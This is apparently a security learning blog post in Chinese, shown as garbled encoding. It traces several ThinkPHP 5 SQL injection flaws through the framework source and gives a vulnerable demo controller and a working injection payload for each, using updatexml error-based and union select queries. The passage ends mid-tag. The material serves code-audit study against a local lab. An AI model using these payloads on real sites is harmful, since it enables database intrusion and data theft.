        <content type="html"><![CDATA[<p>  è¿™æ®µæ—¶é—´å› ä¸ºä¸€äº›åŸå› è€æ˜¯æœ‰ç‚¹è‡ªæˆ‘çº ç»“,å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºå¯¹æ‰€è®¡åˆ’å­¦ä¹ çš„å†…å®¹æ— æ³•å®šå¤ºçš„åŸå› ã€‚ä¸Šå‘¨å› ä¸ºhwæ‰€ä»¥é”™è¿‡äº†wmctf,èµ›åå»çœ‹é¢˜å‘ç°åŸºæœ¬éƒ½æ˜¯phpä¹‹ç±»çš„,éƒ½ä¸æ˜¯å¾ˆæƒ³çœ‹ã€‚ç›¸å¯¹æ„Ÿå…´è¶£çš„æ¡†æ¶çš„é“¾å­è‡ªå·±ä¹Ÿæ²¡æ‰¾å…¨ã€‚æ„Ÿè§‰èœçš„ä¸è¡Œ,ç›¸æ¯”å‡ ä¸ªæœˆå‰å®¡ä¸€äº›æ¯”èµ›ä¸­çš„æ¡†æ¶æ‰‹ç”Ÿäº†å¾ˆå¤šã€‚</p><a id="more"></a><p>  æœ€è¿‘å› ä¸ºä¸€ç›´åœ¨çœ‹Node.jsç›¸å…³çš„æ¼æ´è·Ÿå¼€å‘å»äº†,åŠ ä¸Šè‡ªå·±ä¸€ç›´å¯¹phpå¿ƒé‡Œæœ‰ç§åŒæ¶æ„Ÿ,å¯¼è‡´æ²¡æœ‰åŠ²å¤´å»æ·±å…¥å­¦ä¹ ã€‚è€Œä¸Šå‘¨hwçš„ç»å†è®©æˆ‘æ„è¯†åˆ°phpä»æ—§æ˜¯å›½å†…å„ç§ç½‘ç«™çš„å¤§å¤´ã€‚æ‰€ä»¥ç—›ä¸‹å†³å¿ƒ,å¼€å§‹æŠŠphpè·Ÿjavaçš„çŸ¥è¯†åŒæ­¥å­¦ä¹ ã€‚è¿™é‡Œå°±ç”¨çº¢æ—¥ä¸ƒæœˆç«å¸ˆå‚…ä»–ä»¬çš„<a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">thinkphpvuln</a>é¡¹ç›®å§ã€‚å¸Œæœ›èƒ½å¤Ÿå¯¹ä»£å®¡çš„åŠŸåŠ›æœ‰æ‰€æå‡ã€‚</p><h2 id="tp5-sqli-insert"><a href="#tp5-sqli-insert" class="headerlink" title="tp5-sqli-insert"></a>tp5-sqli-insert</h2><p>å®‰è£…çš„è¯composer ä¸€æŠŠæ¢­ã€‚å…·ä½“å‚è§Thinkphp-vulné¡¹ç›®ã€‚å®‰è£…tpdemo<br>5.0.13&lt;=ThinkPHP&lt;=5.0.15 ã€ 5.1.0&lt;=ThinkPHP&lt;=5.1.5 ç‰ˆæœ¬é—´çš„sqlæ³¨å…¥æ¼æ´ã€‚åˆ©ç”¨çš„è¯éœ€è¦æ›´æ”¹Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        db(<span class="string">'users'</span>)-&gt;insert([<span class="string">'username'</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/Thinkphp-vuln/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ³¨æ„è¿™æ˜¯åœ¨å¼€å¯äº†tpçš„app_debugæƒ…å†µä¸‹çš„ã€‚å¦åˆ™æˆ‘ä»¬çš„æŠ¥é”™æ³¨å…¥åº”è¯¥æ˜¯çœ‹ä¸åˆ°å›æ˜¾ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è·Ÿç€Index.phpä¸­dbè¿™è¡Œè¯­å¥,è·Ÿè¿›think/db/Query.phpçš„insertå‡½æ•°ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ‰§è¡Œçš„sqlè¯­å¥å¦‚ä¸‹ã€‚æˆ‘ä»¬å¿…ç„¶è¦è·Ÿè¿›è¿™ä¸ªsqlè¯­å¥ç ”ç©¶æ³¨å…¥çš„å¯èƒ½ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="keyword">$this</span>-&gt;builder-&gt;insert($data, $options, $replace);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ <code>$this-&gt;builder</code> ä¸º\think\db\builder\Mysql ç±»(è¿™ä¸ªå…¶å®å°±å–å†³äºä½ è¿æ¥çš„æ•°æ®åº“ç±»å‹ã€‚ç¨å¾®å¾€å‰è·Ÿä¸‹å¯ä»¥çœ‹åˆ°) Mysqlç±»ç»§æ‰¿äºBuilderç±»ã€‚æ‰€ä»¥<br>çœ‹å‘Builderçš„insertå‡½æ•°ã€‚</p><p><img src="/2020/08/05/Thinkphp-vuln/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é‡Œå…ˆè·Ÿè¿›ä¸‹parseData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span><span class="params">($data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–ç»‘å®šä¿¡æ¯</span></span><br><span class="line">    $bind = <span class="keyword">$this</span>-&gt;query-&gt;getFieldsBind($options[<span class="string">'table'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'*'</span> == $options[<span class="string">'field'</span>]) &#123;</span><br><span class="line">        $fields = array_keys($bind);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $fields = $options[<span class="string">'field'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        $item = <span class="keyword">$this</span>-&gt;parseKey($key, $options);</span><br><span class="line">        <span class="keyword">if</span> (is_object($val) &amp;&amp; method_exists($val, <span class="string">'__toString'</span>)) &#123;</span><br><span class="line">            <span class="comment">// å¯¹è±¡æ•°æ®å†™å…¥</span></span><br><span class="line">            $val = $val-&gt;__toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === strpos($key, <span class="string">'.'</span>) &amp;&amp; !in_array($key, $fields, <span class="keyword">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($options[<span class="string">'strict'</span>]) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'fields not exists:['</span> . $key . <span class="string">']'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_null($val)) &#123;</span><br><span class="line">            $result[$item] = <span class="string">'NULL'</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val) &amp;&amp; !<span class="keyword">empty</span>($val)) &#123;</span><br><span class="line">            <span class="keyword">switch</span> ($val[<span class="number">0</span>]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'exp'</span>:</span><br><span class="line">                    $result[$item] = $val[<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'inc'</span>:</span><br><span class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'dec'</span>:</span><br><span class="line">                    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'-'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($val)) &#123;</span><br><span class="line">            <span class="comment">// è¿‡æ»¤éæ ‡é‡æ•°æ®</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> === strpos($val, <span class="string">':'</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;query-&gt;isBind(substr($val, <span class="number">1</span>))) &#123;</span><br><span class="line">                $result[$item] = $val;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $key = str_replace(<span class="string">'.'</span>, <span class="string">'_'</span>, $key);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;query-&gt;bind(<span class="string">'data__'</span> . $key, $val, <span class="keyword">isset</span>($bind[$key]) ? $bind[$key] : PDO::PARAM_STR);</span><br><span class="line">                $result[$item] = <span class="string">':data__'</span> . $key;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parsedataæ¥å—çš„å‚æ•°æ˜¯æˆ‘ä»¬ä¼ è¿›çš„å‚æ•°useranmeæ•°æ®ã€‚ç®€å•çœ‹ä¸‹ä¼šå‘ç°ä¸­é—´çš„ä¸€ä¸ªforå¾ªç¯æ˜¯åœ¨éå†æˆ‘ä»¬ä¼ è¿›çš„æ•°ç»„å¹¶ä¸”åªæ˜¯è¿›è¡Œä¸€ä¸ªæ‹¼æ¥çš„æ“ä½œã€‚æœ€åè¿”å›æ•°æ®ã€‚æ¯”å¦‚æˆ‘ä»¬çš„payloadå¯¹åº”å¦‚ä¸‹ã€‚<code>$val[0]=inc</code>,ä¹‹åè¿”å›çš„<code>$result</code>åªæ˜¯<code>$val[1],$val[2]</code>çš„æ‹¼æ¥ã€‚parseKey æ–¹æ³•å¹¶æ²¡æœ‰åœ¨å¤„ç†æˆ‘ä»¬çš„è¾“å…¥æ•°æ®åå½±å“ä»€ä¹ˆã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'inc'</span>:</span><br><span class="line">    $result[$item] = <span class="keyword">$this</span>-&gt;parseKey($val[<span class="number">1</span>]) . <span class="string">'+'</span> . floatval($val[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">æ‰€ä»¥è¿™é‡Œå¤„ç†å®Œåå›åˆ°insertå‡½æ•°ã€‚æˆ‘ä»¬çš„è¾“å…¥ç›´æ¥é€åˆ°è¿”å›æ‹¼æ¥çš„sqlè¯­å¥ã€‚é€ æˆsqlæ³¨å…¥</span><br><span class="line">å®Œæ•´è¯­å¥ä¸å¦¨ç›´æ¥åœ¨debugæŠ¥é”™çš„åœ°æ–¹çœ‹ã€‚ä¼šå‘ç°å›æ˜¾äº†sqlè¯­å¥</span><br><span class="line">```sql</span><br><span class="line">INSERT INTO `users` (`username`) VALUES (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,version(),<span class="number">0x7e</span>),<span class="number">1</span>)+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ä¸Šé¢caseè¯­å¥é‚£é‡Œç†è®ºä¸Š<code>exp,inc,dec</code>éƒ½å¯ä»¥é€ æˆsqlæ³¨å…¥ã€‚ä½†å®é™…æµ‹è¯•ä¼šå‘ç°åªæœ‰<code>username[0]</code>ä¸º<code>exp</code>æ— æ³•æ³¨å…¥ã€‚è¿™æ˜¯å› ä¸ºthinkphpå†…ç½®è¿‡æ»¤ä¼šå°†expå¤„ç†å˜ä¸º<code>exp{ç©ºæ ¼}</code>ã€‚å¯¼è‡´æ— æ³•æ³¨å…¥ã€‚</p><h2 id="tp5-sqli-update"><a href="#tp5-sqli-update" class="headerlink" title="tp5-sqli-update"></a>tp5-sqli-update</h2><p>é…ç½®Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        db(<span class="string">'users'</span>)-&gt;where([<span class="string">'id'</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">'username'</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Update success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´æ€è·¯è·Ÿä¸Šé¢ä¸€æ ·ã€‚åªä¸è¿‡æ­¤å¤„æ˜¯updateæ³¨å…¥ã€‚æˆ‘ä»¬åŒæ ·å¯ä»¥è·Ÿåˆ°Query.phpã€‚å‘ç°å…¶å®è°ƒç”¨çš„æ˜¯Connectionç±»çš„updateæ–¹æ³•ã€‚ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql  = <span class="keyword">$this</span>-&gt;builder-&gt;update($query);</span><br></pre></td></tr></table></figure><p>builderä¾æ—§æ˜¯ä¸Šé¢æè¿‡çš„Builderç±»å¯¹è±¡ã€‚å…¶updateæ–¹æ³•ä¾æ—§æ˜¯å…ˆè°ƒç”¨parseDataå†è¿›è¡Œsqlè¯­å¥çš„è¿”å›ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ä¿®å¤åçš„parseDataçš„caseè¯­å¥<br><img src="/2020/08/05/Thinkphp-vuln/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>defaultä»£ç æ®µparseArrayData</p><p><img src="/2020/08/05/Thinkphp-vuln/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>(è¿™é‡Œæˆ‘composerè£…ä¸äº†tp5.1.7,å¦‚æœæ˜¯ä¹‹å‰çš„ç‰ˆæœ¬parseArrayDataåº”è¯¥æ˜¯ç›´æ¥è¿”å›falseçš„)</p><p>å¯ä»¥çœ‹åˆ°æœ€åå…¶å®resultæ˜¯è¿™æ ·å½¢å¼çš„å­—ç¬¦ä¸²<code>$fun(&#39;$point($value)&#39;)</code>ã€‚é‚£ä¸æˆ‘ä»¬ä¹‹å‰çš„åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«,è¿˜æ˜¯æœ‰æ‹¼æ¥ã€‚ç›´æ¥æ„é€ æˆ<code>updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</code>å³å¯.æ‰€ä»¥æˆ‘ä»¬å‰é¢åªè¦è¿›å…¥defaultåˆ†æ”¯å°±èƒ½è¾¾æˆè¿™é‡Œçš„sqlè¯­å¥æ„é€ äº†ã€‚</p><p>æœ€åæ”»å‡»payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><h2 id="tp5-sqli-select"><a href="#tp5-sqli-select" class="headerlink" title="tp5-sqli-select"></a>tp5-sqli-select</h2><p>é…ç½®Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where(<span class="string">'username'</span>,<span class="string">'exp'</span>,$username)-&gt;select();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'select success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>ä»æˆåŠŸæ‰§è¡Œæ³¨å…¥çš„debugç•Œé¢å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‰§è¡Œçš„sqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`users`</span> <span class="keyword">WHERE</span> ( <span class="string">`username`</span> ) <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment"># )</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªtp5å…¨ç‰ˆæœ¬çš„æ³¨å…¥ã€‚ä¸è¿‡ä¼¼ä¹å®˜æ–¹ä¸è®¤è¿™ä¸ªæ´ã€‚<br>æ¥ä¸‹æ¥ç›´æ¥è·Ÿä¸‹æºç .<br>é¦–å…ˆæˆ‘ä»¬ä¸Šé¢çš„<code>$username = request()-&gt;get(&#39;username&#39;);</code>ä¼šç»è¿‡Requestç±»è°ƒç”¨inputæ–¹æ³•å¤„ç†è¾“å…¥.ä½†æ˜¯è¿™ä¸ªinputæ–¹æ³•å¹¶æ²¡æœ‰èµ·åˆ°è¿‡æ»¤çš„ä½œç”¨ã€‚åƒæˆ‘ä»¬payloadä¸­ä¸å«<code>/</code>å’Œ<code>.</code>çš„è¯å°±æ˜¯ç›´æ¥åŸæ•°æ®è¿”å›ã€‚</p><p>ç„¶åæˆ‘ä»¬çœ‹åˆ°æ¥ä¸‹æ¥è°ƒç”¨çš„Queryç±»çš„whereæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span><span class="params">($field, $op = null, $condition = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $param = func_get_args();</span><br><span class="line">    array_shift($param);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parseWhereExp(<span class="string">'AND'</span>, $field, $op, $condition, $param);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parseWhereExp</code>è¿™é‡Œä¸ç”¨æ·±å…¥,ä¸»è¦æ˜¯åˆ†ææŸ¥è¯¢æ¨¡å¼ã€‚ç›´æ¥çœ‹è¿”å›å€¼çš„è¯ä¼šå‘ç°è®¾ç½®äº†ç±»ä¸­çš„<code>$options[&#39;where&#39;]</code>ã€‚æˆ‘ä»¬ä¸»è¦çœ‹åé¢<code>select()</code></p><p>æ¥ä¸‹æ¥ä¾æ—§æ˜¯tp5æ‰§è¡Œsqlè¯­å¥çš„è€å¥—è·¯ã€‚å®é™…è°ƒç”¨çš„æ˜¯Builderç±»çš„select æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•è°ƒç”¨äº†å·¨é‡çš„str_replace()ç”¨äºå¡«å……è¯­å¥ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>whereè¯­å¥æ˜¯å­˜åœ¨ç”¨æˆ·å¯æ§å˜é‡çš„ã€‚æ‰€ä»¥è·Ÿè¿›<code>parseWhere</code>.ç„¶åå‘ç°è°ƒç”¨<code>buildWhere</code></p><p>buildwhereä»£ç é‡ç›¸å¯¹æ›´å¤šã€‚ä½†æ˜¯åŒæ ·å­˜åœ¨ä¸€ä¸ªforå¾ªç¯<code>foreach ($where as $key =&gt; $val)</code>.è¿™é‡Œæˆ‘ä»¬è¿›å…¥æœ€åä¸€ä¸ªelseã€‚å¹¶ä¸”è°ƒç”¨<code>parseWhereItem</code>ã€‚<br>è€ŒparseWhereItemä¸­æœ‰è¿™æ ·çš„elseif</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="string">'EXP'</span> == $exp) &#123;</span><br><span class="line"><span class="comment">// è¡¨è¾¾å¼æŸ¥è¯¢</span></span><br><span class="line">    $whereStr .= <span class="string">'( '</span> . $key . <span class="string">' '</span> . $value . <span class="string">' )'</span>;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„keyä¸ºusernameã€‚valueä¸ºå¯æ§å˜é‡ã€‚å³å¯æ‹¼æ¥è¾¾æˆæ³¨å…¥ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="tp5-0-sqli-select-5-0-10"><a href="#tp5-0-sqli-select-5-0-10" class="headerlink" title="tp5.0-sqli-select-5.0.10"></a>tp5.0-sqli-select-5.0.10</h2><p>5.0.10ç‰ˆæœ¬çš„sqlæ³¨å…¥ã€‚é…ç½®Index.phpå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">'username/a'</span>);</span><br><span class="line">        $result = db(<span class="string">'users'</span>)-&gt;where([<span class="string">'username'</span> =&gt; $username])-&gt;select();</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤ç°payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[0]&#x3D;not like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;) union select 1,user()#</span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/Thinkphp-vuln/7.PNG" class="lazyload" data-srcset="7.PNG" 